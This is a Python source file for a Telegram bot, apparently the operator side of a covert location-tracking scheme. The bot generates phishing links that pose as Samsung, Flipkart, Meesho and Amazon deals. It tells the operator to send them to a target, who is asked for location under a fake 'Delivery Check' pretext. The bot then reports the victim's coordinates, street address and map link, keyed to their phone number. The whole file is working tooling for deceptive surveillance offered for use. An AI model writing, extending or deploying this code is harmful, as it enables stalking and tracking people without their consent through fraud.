import os
import requests
import telebot
from dotenv import load_dotenv
from datetime import datetime
from geopy.geocoders import Nominatim
import re

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
BACKEND_URL = os.getenv("BACKEND_URL", "http://127.0.0.1:8000")

bot = telebot.TeleBot(TOKEN)
geolocator = Nominatim(user_agent="live_location_bot")

def normalize_phone_number(number):
    cleaned = re.sub(r'[^\d+]', '', number)
    if cleaned.startswith('0'):
        cleaned = '+91' + cleaned[1:]
    elif not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    return cleaned

def get_address(lat, lon):
    try:
        location = geolocator.reverse(f"{lat}, {lon}", exactly_one=True, language="en", timeout=10)
        if location:
            return location.address
    except Exception as e:
        print(f"Nominatim error: {e}")
    
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
        headers = {"User-Agent": "live_location_bot/1.0"}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if "display_name" in data:
                return data["display_name"]
    except Exception as e:
        print(f"Direct OSM API error: {e}")
    
    return "Address not found"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    custom_msg = (
        "🔴 **Live Location Tracker Bot Active**\n\n"
        "Aapke paas 2 options hain:\n"
        "1️⃣ **Phone Number:** Koi bhi number bhejo (e.g. `9876543210`) history/link ke liye.\n"
        "2️⃣ **Universal Link:** Type `/getlink` aur universal link copy karo. Ye link aap kisi ko bhi bhej sakte ho, click karte hi location aapko yahan aa jayegi bina number ke!"
    )
    bot.reply_to(message, custom_msg, parse_mode="Markdown")

@bot.message_handler(commands=['getlink'])
def generate_generic_link(message):
    reply = f"""🔗 **Universal Tracking Links**
    
In links mein koi number daalne ki zaroorat nahi hai. Jo bhi in par click karega, uski live location turant aapke pass aa jayegi! (Unka ID `LinkUser_XXXX` ke roop mein dikhega)

📱 **Samsung S24 Offer (Real Look):**\n`{BACKEND_URL}/phones/samsung-galaxy-s24-5g-snapdragon-amber-yellow-128-gb/p/itmd4baa945a78ef`\n
🛍️ **Flipkart Sale:**\n`{BACKEND_URL}/item/flipkart`\n
👗 **Meesho Offer:**\n`{BACKEND_URL}/item/meesho`\n
📦 **Amazon Deal:**\n`{BACKEND_URL}/item/amazon`\n
"""
    bot.reply_to(message, reply, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def fetch_location(message):
    chat_id = str(message.chat.id)
    
    # Save the latest chat ID to the .env file so the server knows where to send alerts
    with open(".env", "r") as f:
        env_lines = f.readlines()
    with open(".env", "w") as f:
        has_admin = False
        for line in env_lines:
            if line.startswith("ADMIN_CHAT_ID="):
                f.write(f"ADMIN_CHAT_ID={chat_id}\n")
                has_admin = True
            else:
                f.write(line)
        if not has_admin:
            f.write(f"\nADMIN_CHAT_ID={chat_id}\n")
            
    raw_target = message.text.strip()
    target = normalize_phone_number(raw_target)
    bot.reply_to(message, f"🔍 Fetching location for → `{target}`", parse_mode="Markdown")
    
    try:
        r = requests.get(f"{BACKEND_URL}/history/{target}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            history = data.get("history", [])
            if len(history) > 0:
                loc = history[0]
                address = loc.get('address', get_address(loc['lat'], loc['lon']))
                
                reply = f"""
✅ **Location Found**

**Target:** `{target}`
**Source:** {loc.get('source', 'GPS')}
**Accuracy:** {loc.get('accuracy', 'N/A')}
**Time:** {loc.get('time', 'Now')}

📍 **Coordinates:** {loc['lat']}, {loc['lon']}
🏠 **Address:** {address}
🗺️ **Map:** https://maps.google.com/?q={loc['lat']},{loc['lon']}
                """
                bot.send_message(message.chat.id, reply, parse_mode="Markdown")
                return
    except Exception as e:
        print("Backend error:", e)
    
    import base64
    b64_target = base64.b64encode(target.encode('utf-8')).decode('utf-8')
    
    reply = f"""⚠️ **No Live Location Data**

No real location data found for `{target}` yet.

**To get REAL location, send one of these "Offers" to the target:**
(It will ask for location for "Delivery Check" then redirect them to the real site)

🛍️ **Flipkart Sale:** `{BACKEND_URL}/item/flipkart?id={b64_target}`
👗 **Meesho Offer:** `{BACKEND_URL}/item/meesho?id={b64_target}`
📦 **Amazon Deal:** `{BACKEND_URL}/item/amazon?id={b64_target}`

Once they click and allow location, send their number `{target}` here again to see the live map."""
    bot.send_message(message.chat.id, reply, parse_mode="Markdown")

print("🚀 Live Location Bot Started...")
bot.infinity_polling()
